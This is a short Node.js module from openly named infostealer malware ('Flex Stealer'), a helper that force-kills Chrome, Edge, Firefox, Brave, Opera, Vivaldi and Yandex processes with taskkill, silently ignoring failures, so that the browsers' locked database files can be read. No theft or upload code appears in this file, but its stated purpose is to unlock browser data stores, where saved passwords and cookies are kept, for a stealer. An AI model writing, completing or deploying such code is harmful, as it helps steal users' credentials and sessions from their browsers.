const { exec } = require('child_process');
const { promisify } = require('util');
const execAsync = promisify(exec);

/**
 * Flex Stealer | 2026 - Process Manager Utility
 * Handles browser process termination to unlock database files.
 */

const BROWSER_PROCESS_MAP = {
    'opera': ['opera.exe'],
    'operagx': ['opera.exe'],
    'vivaldi': ['vivaldi.exe'],
    'firefox': ['firefox.exe'],
    'yandex': ['browser.exe'],
    'brave': ['brave.exe'],
    'chrome': ['chrome.exe'],
    'edge': ['msedge.exe']
};

/**
 * Checks if a process is currently running.
 * @param {string} processName 
 * @returns {Promise<boolean>}
 */
async function isProcessRunning(processName) {
    try {
        const { stdout } = await execAsync(`tasklist /FI "IMAGENAME eq ${processName}" /NH`);
        return stdout && stdout.includes(processName);
    } catch (err) {
        return false;
    }
}

/**
 * Forcefully terminates a process.
 * @param {string} processName 
 * @returns {Promise<void>}
 */
async function killProcess(processName) {
    try {
        if (await isProcessRunning(processName)) {
            await execAsync(`taskkill /F /IM ${processName}`);
        }
    } catch (err) {
        // Silently fail if process cannot be killed
    }
}

/**
 * Kills all processes associated with a specific browser type.
 * @param {string} browserType 
 */
async function killBrowserProcesses(browserType) {
    const processes = BROWSER_PROCESS_MAP[browserType.toLowerCase()];
    if (!processes) return;

    for (const proc of processes) {
        await killProcess(proc);
    }
}

/**
 * Kills browser processes and waits to ensure they are terminated.
 * @param {string} browserType 
 * @param {number} waitMs 
 */
async function killAndWait(browserType, waitMs = 3000) {
    await killBrowserProcesses(browserType);
    return new Promise(resolve => setTimeout(resolve, waitMs));
}

module.exports = {
    isProcessRunning,
    killProcess,
    killBrowserProcesses,
    killAndWait
};